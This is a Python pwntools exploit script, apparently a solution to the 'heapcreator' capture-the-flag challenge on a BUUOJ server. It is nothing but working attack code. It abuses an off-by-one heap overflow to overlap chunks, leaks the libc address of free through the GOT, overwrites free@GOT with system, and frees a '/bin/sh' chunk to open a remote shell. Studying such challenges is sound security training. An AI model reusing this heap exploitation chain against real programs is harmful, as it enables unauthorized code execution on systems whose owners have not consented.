from LibcSearcher import *
from pwn import *
context.log_level="debug"
#io=process("heapcreator")
io = remote('node5.buuoj.cn',26714)
elf=ELF("heapcreator")
def add(size,content):
    io.recvuntil("Your choice :")
    io.sendline("1")
    io.recvuntil("Size of Heap : ")
    io.sendline(str(size))
    io.recvuntil("Content of heap:")
    io.send(content)

def edit(index,content):
    io.recvuntil("Your choice :")
    io.sendline("2")
    io.recvuntil("Index :")
    io.sendline(str(index))
    io.recvuntil("Content of heap : ")
    io.send(content)

def show(index):
    io.recvuntil("Your choice :")
    io.sendline("3")
    io.recvuntil("Index :")
    io.sendline(str(index))

def delete(index):
    io.recvuntil("Your choice :")
    io.sendline("4")
    io.recvuntil("Index :")
    io.sendline(str(index))

add(0x18,'hhhh')
add(0x10,'aaaa')
add(0x10,'pppp')
add(0x10,b'/bin/sh\x00')

payload1=b'a'*0x18+p8(0x81)
edit(0,payload1)
delete(1)

size=0x8
payload2=b'a'*0x40+p64(size)+p64(elf.got["free"])
add(0x70,payload2)

show(2)
io.recvuntil("Content : ")
free_addr=u64(io.recvuntil("Done")[:-5].ljust(8,b'\x00'))
libc=LibcSearcher("free",free_addr)
libc_base=free_addr-libc.dump("free")
system=libc_base+libc.dump("system")
print("libc_base:",end='')
print(hex(libc_base))

payload3=p64(system)
edit(2,payload3)
delete(3)
#gdb.attach(io)
#pause()

io.interactive()